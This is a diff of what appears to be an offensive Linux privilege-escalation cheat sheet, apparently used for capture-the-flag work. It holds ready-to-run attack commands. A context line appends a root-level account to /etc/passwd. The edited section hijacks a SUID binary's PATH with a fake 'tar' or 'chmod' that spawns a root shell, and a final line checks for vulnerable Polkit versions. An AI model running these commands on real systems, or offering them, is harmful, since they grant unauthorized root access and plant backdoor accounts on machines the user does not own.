@@ -1371,14 +1371,12 @@ echo "any:$(openssl passwd -1 root):0:0:root:/root:/bin/bash" >> /etc/passwd && 
 
 +---------- PATH Hijack (suid) ----------+
 strace -f -o file /usr/local/bin/suid-name
-cat file | grep -rine 'chmod '
+cat file | grep -rine 'root'
+cat file | grep -rinE 'chmod |tar '
 env -i bash --norc --noprofile
-TEMPFOLDER=$(mktemp -d)
-printf %s '/bin/bash -i' > $TEMPFOLDER/chmod
-chmod +x $TEMPFOLDER/chmod
-export PATH=$TEMPFOLDER:$PATH
-/usr/local/bin/suid-name
-cat /root/root.txt
+TARGET_SUID=/usr/local/bin/suid-name
+TARGET_BIN=tar
+TEMPFOLDER=$(mktemp -d); printf %s '/bin/bash -i' > $TEMPFOLDER/$TARGET_BIN; chmod +x $TEMPFOLDER/$TARGET_BIN; export PATH=$TEMPFOLDER:$PATH;$TARGET_SUID
 
 +---------- Polkit Version ----------+
 rpm -qa | grep -i polkit | grep -i "0.11[3-9]"
